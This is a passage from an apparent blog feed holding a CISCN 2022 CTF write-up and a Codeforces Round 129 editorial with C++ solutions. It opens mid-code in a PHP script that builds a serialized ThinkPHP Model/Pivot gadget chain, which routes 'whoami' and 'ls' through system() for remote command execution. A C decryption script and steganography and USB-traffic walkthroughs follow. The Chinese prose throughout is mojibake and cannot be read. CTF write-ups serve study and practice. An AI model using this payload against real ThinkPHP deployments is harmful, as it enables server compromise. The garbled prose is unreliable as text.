class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;ls&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="baby-tree"><a href="#baby-tree" class="headerlink" title="baby_tree"></a>baby_tree</h3><p>ç›´æ¥çœ‹astï¼Œassign_expræ˜¯èµ‹å€¼è¯­å¥ï¼Œbinary_expré‡Œé¢decl=åé¢æ˜¯è¿ç®—ç¬¦ï¼Œargument_listé‡Œçš„ä¸¤ä¸ªargumentå‚ä¸è¿ç®—ï¼Œåˆ†æä¸€ä¸‹ä¸»è¦é€»è¾‘ï¼Œå†™å‡ºå¯¹åº”çš„è§£å¯†è„šæœ¬ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">88</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">225</span>, <span class="number">7</span>, <span class="number">201</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">75</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">218</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">73</span>, <span class="number">130</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">76</span>, <span class="number">201</span>, <span class="number">16</span>, <span class="number">248</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">103</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">79</span>, <span class="number">202</span>, <span class="number">22</span>, <span class="number">131</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">20</span>, <span class="number">16</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> k[] = <span class="string">&quot;345y&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span> - <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">42</span> - <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> r0 = b[i + <span class="number">0</span>], r1 = b[i + <span class="number">1</span>], r2 = b[i + <span class="number">2</span>], r3 = b[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = tmp;</span><br><span class="line">        b[i + <span class="number">0</span>] = r2 ^ k[<span class="number">2</span>];</span><br><span class="line">        b[i + <span class="number">1</span>] = r3 ^ k[<span class="number">3</span>];</span><br><span class="line">        b[i + <span class="number">2</span>] = ((k[<span class="number">0</span>] + (b[i + <span class="number">0</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span>) ^ r0;</span><br><span class="line">        b[i + <span class="number">3</span>] = ((k[<span class="number">1</span>] + (b[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span>) ^ r1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šé¢çš„ç¨‹åºæ‹¿åˆ°flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h3><p>æœ¬æ¥ä»¥ä¸ºä¸æ˜¯lsbéšå†™ï¼ˆå› ä¸ºéšè—å­—æ¯å¤ªå°å¤ªçŠ„è§’æ—®æ—¯äº†æ²¡çœ‹è§ï¼‰ï¼ŒæŸ¥çœ‹å±æ€§æ— ä¿¡æ¯è·å–</p><p>æ‹‰å…¥010editorä¸­æŸ¥çœ‹pngçš„æ–‡ä»¶å¤´å’Œæ–‡ä»¶å°¾ï¼Œå‘ç°æ–‡ä»¶å°¾åé¢æœ‰ä¸€æ®µå¤šå‡ºæ¥çš„å­—ç¬¦ï¼Œä¸çŸ¥é“æ˜¯åšä»€ä¹ˆçš„ï¼Œå…ˆæ”¾ç€</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813046204.png" alt="1653813046204"></p><p>é¢˜ç›®æç¤ºå«lsbéšå†™åï¼Œæ‹‰å…¥StegsolveæŸ¥çœ‹ï¼Œç»ˆäºåœ¨Alpha2å¤„å‘ç°å³ä¸‹è§’æœ‰çŒ«è…»</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653821873989.png" alt="1653821873989"></p><p>ä½†æ˜¯åˆ†æå¹¶æ²¡æœ‰å¾—å‡ºä¿¡æ¯ï¼Œåšä¿¡ä¿¡æ¯å°±éšè—åœ¨è¿™é‡Œï¼ŒæŸ¥é˜…å­—å…¸å‘ç°rowè¯‘ä¸ºä¸­æ–‡æ˜¯è¡Œï¼Œcolumnæ˜¯æŸ±ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å› ä¸ºå³ä¸‹è§’çš„ä¿¡æ¯æ˜¯ä¸€åˆ—çš„ï¼Œè€Œæˆ‘åˆšå¼€å§‹æŸ¥çœ‹æ˜¯ä»¥è¡ŒæŸ¥çœ‹ï¼Œä¿®æ”¹æˆåŠŸæ•°æ®åå‘ç°éšè—æ–‡æœ¬</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813260877.png" alt="1653813260877"></p><p>æ‹¿åˆ°è¿™ä¸²æ•°å­—åç¬¬ä¸€ååº”ä½¿ç”¨lsbçš„å·¥å…·</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824152028.png" alt="1653824152028"></p><p>æ‹¿åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œæ‹‰å…¥010æŸ¥çœ‹å‘ç°æ˜¯å‹ç¼©åŒ…æ–‡ä»¶å¤´ï¼Œæœæ–­ä¿®æ”¹åç¼€åä¸ºrar</p><p>ä½†æ˜¯è§£å‹éœ€è¦å¯†ç ï¼ŒçŒœæµ‹å¼€å¤´åœ¨æ–‡ä»¶å°¾åçš„é‚£ä¸€ä¸²æ˜¯å¯†ç ï¼Œä½†æ˜¯è¾“å…¥åå‘ç°ä¸æ˜¯ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æŸç§åŠ å¯†ï¼Œå¹¿æ³›å°è¯•åå‘ç°æ˜¯md5éšå†™</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653817094602.png" alt="1653817094602">è§£å‹åå¾—åˆ°ä¸€ä¸ªæ²¡æœ‰åç¼€çš„flagæ–‡ä»¶</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653822607451.png" alt="1653822607451"></p><p>æ‹‰å…¥010å‘ç°æ˜¯PNGæ–‡ä»¶ï¼Œæœ¬æ¥æƒ³é€šè¿‡æ”¹åç¼€åæ‹¿åˆ°ç­”æ¡ˆï¼Œåæ¥å‘ç°è¿˜æ˜¯å¤ªå¤©çœŸ</p><p>ä½¿ç”¨pså’Œç”»å›¾æ‰“å¼€æ— æœï¼Œæƒ³åˆ°gimpï¼Œå°†æ–‡ä»¶åç¼€åæ”¹ä¸ºdataåç”¨gimpæ‰“å¼€</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824657534.png" alt="1653824657534"></p><p>å‘ç°å›¾ç‰‡æœ‰äº›æ€ªæ€ªçš„ï¼Œæœ¬æ¥æƒ³æ‹¼å›¾æ‰¾ä¸€ä¸‹flagï¼Œä½†æ˜¯å®åœ¨è€ƒéªŒçœ¼åŠ›ï¼Œäºæ˜¯å°è¯•ä¿®æ”¹å„ç§æ•°å€¼ï¼Œå‘ç°çŒ«è…»å‡ºåœ¨å®½åº¦ä¸Š</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824747017.png" alt="1653824747017"></p><p>æ‹¿åˆ°ç­”æ¡ˆï¼Œæäº¤</p><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><p>ä½¿ç”¨ wireshark æ‰“å¼€å‘ç°æ˜¯ usb é”®ç›˜æµé‡</p><p>æœ‰ä¸¤ä¸ªä¸åŒçš„ usb.addr å‘é€æ•°æ®ï¼Œåˆ†åˆ«å°†å…¶ä¿å­˜åˆ°ä¸¤ä¸ªä¸åŒçš„æµé‡åŒ…</p><p>ç”¨é”®ç›˜æµé‡åˆ†æå·¥å…·å¯¹å…¶æå–æ•°æ®ï¼š<a href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p><p>å‘ç°æœ‰ä¸€ä¸ª <code>rar</code> æ–‡ä»¶ï¼Œä¸€ä¸ª <code>35c535765e50074a</code>ï¼Œæ‰“å¼€raræ–‡ä»¶å‘ç°éœ€è¦å¯†ç ï¼Œåº”è¯¥å¦ä¸€ä¸²å­—ç¬¦å°±æ˜¯å¯†ç ï¼Œè¾“å…¥æˆåŠŸæ‹¿åˆ° <code>flag</code> æ–‡ä»¶</p><h3 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h3><p>å¡«ä¸ªé—®å·è€Œå·²</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CISCN </category>
          
          <category> 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Educational Coeforces Round 129(Div.2)é¢˜è§£</title>
      <link href="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/"/>
      <url>/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ³¢ <code>div2</code> ä¸Šå¤§åˆ†ï¼Œå†™æ³¢é¢˜è§£ã€‚</p><p>å®å†µå½•å±<a href="https://www.bilibili.com/video/BV1RS4y1B7g3">åœ¨è¿™</a></p><span id="more"></span><h2 id="A-Game-with-Cards"><a href="#A-Game-with-Cards" class="headerlink" title="A. Game with Cards"></a>A. Game with Cards</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¢˜ç›®çš„æ„æ€å°±æ˜¯è¯´ï¼Œ<code>Alice</code> å’Œ <code>Bob</code> åˆ†åˆ«æœ‰ <code>n,m</code> å¼ ç‰Œï¼Œç„¶åæ¯æ¬¡å‡ºç‰Œä¸èƒ½å°äºç­‰äºä¸Šä¸€æ¬¡çš„å‡ºç‰Œï¼Œå¦‚æœåˆ°è‡ªå·±çš„å›åˆå´ä¸èƒ½å‡ºç‰Œåˆ™åˆ¤è´Ÿï¼Œé—®å¦‚æœä¸¤äººåˆ†åˆ«å…ˆæ‰‹ï¼Œè°ä¼šèµ¢ï¼Ÿè¿™ä¸ªç¨å¾®æƒ³ä¸€ä¸‹å°±èƒ½å‘ç°æˆ‘ä¸€å¼€å§‹å‡ºæœ€å¤§çš„ä¸€å®šæ˜¯æœ€ä¼˜çš„ç­–ç•¥ï¼Œæ¯”çš„å°±æ˜¯æœ€å¤§å€¼è°æœ€å¤§ï¼Œå‡è®¾ç›¸ç­‰é‚£æˆ‘è‚¯å®šå‡ºæœ€å¤§çš„é‚£ä¸ªæˆ‘å¿…èµ¢ï¼Œæ‰€ä»¥æ— è„‘æ¯”æœ€å¤§å°±æ˜¯è¿™é¢˜çš„æ€è·¯ï¼Œå¦‚æœç›¸ç­‰é‚£ä¹ˆè°å…ˆæ‰‹è°èµ¢ï¼Œæ‰€ä»¥è¿™é‡Œå°±åˆ†ä¸‰ç§æƒ…å†µï¼š</p><ol><li><code>max1&gt;max2</code>ï¼š<code>Alice</code>å¿…èµ¢</li><li><code>max1&lt;max2</code>ï¼š<code>Bob</code>å¿…èµ¢</li><li><code>max1==max2</code>ï¼šè°å…ˆæ‰‹è°èµ¢</li></ol><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> max1=<span class="number">0</span>,max2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max1=<span class="built_in">max</span>(max1,x);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max2=<span class="built_in">max</span>(max2,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(max1&gt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nAlice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max1&lt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bob\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Card-Trick"><a href="#B-Card-Trick" class="headerlink" title="B. Card Trick"></a>B. Card Trick</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ä¸€ä¸ªä»¥å‰ç»å¸¸ç©çš„é­”æœ¯ï¼Œå°±æ˜¯å‡è£…æ´—ç‰Œï¼Œå®åˆ™é‚£å¼ ç‰Œåœ¨å“ªé‡Œè®°å¾—æ¸…æ¸…æ¥šæ¥šã€‚ç»™ä¸€ä¸ªåºåˆ—ï¼Œæ¯æ¬¡æ“ä½œä¼šæŠŠå‰ <code>k</code> ä¸ªå€¼ç§»åŠ¨åˆ°æœ€åå»ã€‚é—®ç»è¿‡è‹¥å¹²æ¬¡æ“ä½œä¹‹åç¬¬ä¸€ä¸ªç‰Œçš„å€¼æ˜¯å¤šå°‘ï¼Œä¸éš¾å‘ç°å¦‚æœè¿›è¡Œä¸€æ¬¡æ“ä½œç›¸å½“äºç¬¬ <code>k+1</code> å¼ ç‰Œä¼šå˜æˆç¬¬ä¸€å¼ ç‰Œï¼Œå› ä¸ºæ˜¯ç›´æ¥ç§»åŠ¨ï¼Œä¸æ”¹å˜é¡ºåºï¼Œæ‰€ä»¥ä¸éš¾æƒ³åˆ°æ”¹é¢˜ç›®å°±æ˜¯ç»Ÿè®¡æ‰€æœ‰çš„æ“ä½œæ¬¡æ•°æœ€åå¯¹ <code>n</code> å–æ¨¡å¾—åˆ°çš„ä¸‹æ ‡å°±æ˜¯ç¬¬ä¸€å¼ ç‰Œçš„ä½ç½®ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x,op,ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=x;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        ans+=op;</span><br><span class="line">        ans%=n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[ans+<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Double-Sort"><a href="#C-Double-Sort" class="headerlink" title="C. Double Sort"></a>C. Double Sort</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä¸¤ä¸ªåºåˆ—ï¼Œæ¯æ¬¡ä¸€èµ·äº¤æ¢ï¼Œé—®æœ€åèƒ½å¦äº¤æ¢æˆéƒ½ä¸é€’å‡ï¼Œä¸”è‹¥èƒ½åˆ™è¾“å‡ºäº¤æ¢æ¬¡æ•°æœ€å°‘çš„æ–¹æ¡ˆã€‚æˆ‘ä»¬ç›´æ¥å®šä¹‰ç»“æ„ä½“å­˜å‚¨ä¸¤ä¸ªåºåˆ—çš„å€¼å†é‡è½½å°äºå·ï¼Œè®©å®ƒä¸¥æ ¼æŒ‰ <code>a</code> é€’å¢ï¼Œç›¸ç­‰çš„æƒ…å†µæŒ‰ <code>b</code>é€’å¢ï¼Œå› ä¸ºäº¤æ¢æ¬¡æ•°æœ€å°‘ï¼Œä¸éš¾æƒ³åˆ°ç”¨é€‰æ‹©æ’åºå¯ä»¥è¾¾åˆ°äº¤æ¢æ¬¡æ•°æœ€å°‘çš„ç›®çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å…ˆæ’ä¸ªåºï¼Œç„¶ååˆ¤æ–­ <code>b</code> çš„å€¼æ˜¯å¦ä¸é€’å‡å°±å¯ä»¥äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 